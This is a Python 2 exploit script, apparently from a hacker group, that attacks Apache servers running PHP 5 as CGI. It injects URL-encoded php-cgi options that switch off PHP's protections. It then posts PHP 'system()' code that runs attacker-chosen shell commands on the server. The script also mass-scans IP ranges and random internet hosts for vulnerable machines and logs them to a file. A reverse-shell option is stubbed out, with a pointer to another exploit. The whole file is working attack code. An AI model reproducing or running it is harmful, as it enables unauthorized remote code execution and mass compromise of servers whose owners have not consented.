#!/usr/bin/env python
#
# ap-unlock.py - apache + php 5.* rem0te c0de execution 0day
#
# NOTE:
#   - quick'n'dirty
#   - '-x' is missing. copy&paste connect-back shell php code from kingcope's
#   exploit: http://www.exploit-db.com/exploits/29290/
#   - scanner is not multithreaded. as alternative use:
#   ./pnscan -L10000 -w"GET /cgi-bin/php HTTP/1.0\r\n\r\n" -r "500 
#   Internal" <cidrrange> 80 | grep Apache (or get *scan, harhar)
#
# by noptrix - http://nullsecurity.net/

import sys
import socket
import argparse
import threading
import time
import random
import select

t3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \
        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \
        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \
        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\
        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\r\nHost:localhost\r\n'\
        'Content-Type: text/html\r\nContent-Length:1\r\n\r\na\r\n'

def enc0dez():
    n33dz1 = ('cgi-bin', 'php')
    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',
            'suhosin.simulation=on', '-d', 'disable_functions=""', '-d',
            'open_basedir=none', '-d', 'auto_prepend_file=php://input',
            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',
            '-d', 'auto_prepend_file=php://input', '-n')
    fl4g = 0
    arg5 = ''
    p4th = ''
    plus = ''
 
    for x in n33dz2:
        if fl4g == 1:
            plus = '+'
        arg5 = arg5 + plus + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
        fl4g = 1
    for x in n33dz1:
        p4th = p4th + '/' + \
                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)
    return (p4th.upper(), arg5.upper())

def m4k3_p4yl0rd(p4yl0rd, vuln):
    p4th, arg5 = enc0dez()
    if vuln:
        p4yl0rd = t3st
    else:
        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\r\n' \
                'Host: ' + sys.argv[1] + '\r\n' \
                'Content-Type: application/x-www-form-urlencoded\r\n' \
                'Content-Length: ' + str(len(p4yl0rd)) + '\r\n\r\n' + p4yl0rd
    return p4yl0rd

def s3nd_sh1t(args, vuln):
    pat = '<b>Parse error</b>:'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(float(args.t))
        res = s.connect_ex((args.h, int(args.p)))
        if res == 0:
            if vuln:
                p4yl0rd = m4k3_p4yl0rd('', vuln)
                s.sendall(p4yl0rd)
                data = s.recv(4096)
                if pat in data:
                    print "[*] " + args.h + " vu1n"
                    return args.h
                return
            else:
                p4yl0rd = m4k3_p4yl0rd('<? system("' + args.c + '"); ?>', vuln)
                s.sendall(p4yl0rd)
        while True:
            rd, wd, ex = select.select([s], [], [], float(args.t))
            if rd:
                data = s.recv(4096)
                sys.stdout.flush()
                sys.stdout.write(data)
                sys.stdout.write('\n')
            else:
                return
        #for line in s.makefile():
        #    print line,
    except socket.error:
        return
    return

def m4k3_r4nd_1p4ddr(num):
    h0sts = []
    for x in range(int(num)):
        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),
                random.randrange(0,255), random.randrange(0,255),
                random.randrange(0,255)))
    return h0sts

def sc4n_r4ng3(rsa, rsb, args, vuln):
    vu1nz = []
    for i in range (rsa[0], rsb[0]):
        for j in range (rsa[1], rsb[1]):
            for k in range (rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    args.h = str(i) + "." + str(j) + "." + str(k) + "." + str(l)
                    vu1nz.append(s3nd_sh1t(args, vuln))
                    time.sleep(0.005)
    vu1nz = filter(None, vu1nz)
    return vu1nz

def m4k3_ipv4_r4ng3(iprange):
    a = tuple(part for part in iprange.split('.'))
    rsa = (range(4))
    rsb = (range(4))
    for i in range(0,4):
        ga = a[i].find('-')
        if ga != -1:
            rsa[i] = int(a[i][:ga])
            rsb[i] = int(a[i][1+ga:]) + 1                                        
        else:
            rsa[i] = int(a[i])
            rsb[i] = int(a[i]) + 1
    return (rsa, rsb)

def parse_args():
    p = argparse.ArgumentParser(
    usage='\n\n  ./ap-unlock.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]' \
            '\n  ./ap-unlock.py -r <4rg> | -R <4rg> [0pt1ons]',
    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
    opts = p.add_argument_group('0pt1ons', '')
    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',
            help='| t3st s1ngle h0st f0r vu1n')
    opts.add_argument('-p', default=80, metavar='80',
            help='| t4rg3t p0rt (d3fau1t: 80)')
    opts.add_argument('-c', metavar='\'uname -a;id\'',
            help='| s3nd c0mm4nds t0 h0st')
    opts.add_argument('-x', metavar='192.168.0.2 1337',
            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')
    opts.add_argument('-s', action='store_true',
            help='| t3st s1ngl3 h0st f0r vu1n')
    opts.add_argument('-r', metavar='133.1.3-7.7-37',
            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')
    opts.add_argument('-R', metavar='1337',
            help='| sc4nz num r4nd0m h0st5 f0r vu1n')
    opts.add_argument('-t', default=3, metavar='3',
            help='| t1me0ut in s3x (d3fau1t: 3)')
    opts.add_argument('-f', metavar='vu1n.lst',
            help='| wr1t3 vu1n h0sts t0 f1l3')
    args = p.parse_args()
    if not args.h and not args.r and not args.R:
        p.print_help()
        sys.exit(0)
    return args

def m41n():
    if  __name__ == "__main__":
        print "--==[ ap-unlock.py by noptrix@nullsecurity.net ]==--"
        vuln = 0
        try:
            args = parse_args()
            if not args.t:
                args.t = float(3)
            if args.h:
                if args.s:
                    print "[+] sc4nn1ng s1ngl3 h0st %s " % (args.h)
                    vuln = 1
                    s3nd_sh1t(args, vuln)
                elif args.c:
                    print "[+] s3nd1ng c0mm4ndz t0 h0st %s " % (args.h)
                    s3nd_sh1t(args, vuln)
                elif args.x:
                    print "[+] xpl0it1ng b0x %s " % (args.h)
                    print "t0d0"
                else:
                    print "[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch"
                    sys.exit(-1)
            if args.r:
                print "[+] sc4nn1ng r4ng3 %s " % (args.r)
                vuln = 1
                rsa, rsb = m4k3_ipv4_r4ng3(args.r)
                vu1nz = sc4n_r4ng3(rsa, rsb, args, vuln)
            if args.R:
                print "[+] sc4nn1ng %d r4nd0m b0xes" % (int(args.R))
                vuln = 1
                h0sts = m4k3_r4nd_1p4ddr(int(args.R))
                for h0st in h0sts:
                    args.h = h0st
                    s3nd_sh1t(args, vuln)
        except KeyboardInterrupt:
            sys.stdout.flush()
            sys.stderr.write("\b\b[!] w4rn1ng: ab0rt3d bY us3r\n")
            raise SystemExit
        if args.f:
            if vu1nz:
                f = open(args.f, "w")
                f.write("\n".join(vu1nz)+"\n")
                f.close()
    else:
        print "[-] 3rr0r: y0u fuck3d up dud3"
        sys.exit(1)
    print "[+] h0p3 1t h3lp3d"

m41n()
